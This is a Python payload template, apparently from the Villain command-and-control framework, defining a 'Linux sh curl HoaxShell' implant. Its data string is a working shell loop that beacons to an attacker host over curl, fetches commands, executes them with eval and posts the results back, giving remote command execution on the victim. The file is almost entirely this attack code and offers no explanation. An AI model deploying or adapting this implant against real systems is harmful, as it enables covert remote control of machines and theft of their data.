#!/usr/bin/env python3
# Villain payload template - Linux sh curl HoaxShell


class Payload:

    def __init__(self):
        self.meta = {
            'os': 'linux',
            'handler': 'hoaxshell',
            'shell': 'unix',
            'type': 'sh-curl'
        }

        self.info = {
            'Title': 'Linux sh curl HoaxShell',
            'Description': 'POSIX sh HoaxShell implant using curl. Beacon with constraint mode on.'
        }

        self.parameters = {
            'lhost': '',
        }

        self.config = {
            'frequency': 5
        }

        self.attrs = {}

        self.data = (
            "session='*SESSIONID*';"
            "while true; do "
            "cmd=$(curl -s -H '*HOAXID*: '$session' http://*LHOST*/*GETCMD* 2>/dev/null);"
            "if [ \"$cmd\" != 'None' ] && [ -n \"$cmd\" ]; then "
            "out=$(eval \"$cmd\" 2>&1);"
            "curl -s -X POST -H '*HOAXID*: '$session' --data-binary \"$out\" http://*LHOST*/*POSTRES* >/dev/null 2>&1;"
            "fi; "
            "curl -s -H '*HOAXID*: '$session' http://*LHOST*/*VERIFY* >/dev/null 2>&1;"
            "sleep *FREQ*; "
            "done"
        )
